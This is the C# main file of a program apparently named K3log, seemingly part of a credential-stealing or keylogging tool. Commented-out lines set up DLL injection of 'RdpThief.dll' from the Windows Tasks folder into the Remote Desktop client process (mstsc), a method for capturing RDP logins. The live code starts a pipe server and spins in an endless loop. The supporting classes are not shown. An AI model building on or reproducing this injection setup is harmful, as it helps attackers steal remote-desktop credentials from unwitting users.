using System;

namespace K3log
{
	static class Program
	{

		
		static void Main(String[] args)
		{


			// init string collection
			//
			//StringsCollector strc = new StringsCollector();
			//strc.startCollector();



			///DLL injection
			///
			//InDinLib dllinj = new InDinLib();
			//string procName = "mstsc";
			//string dllpath = "C:\\Windows\\Tasks\\RdpThief.dll";
			//dllinj.monitorProcAndInj(procName, dllpath);


			//Pipe server

			pipeServer ps = new pipeServer();
			ps.StartServer();

			while (true) { 
			
			
			}
		}
	}
}
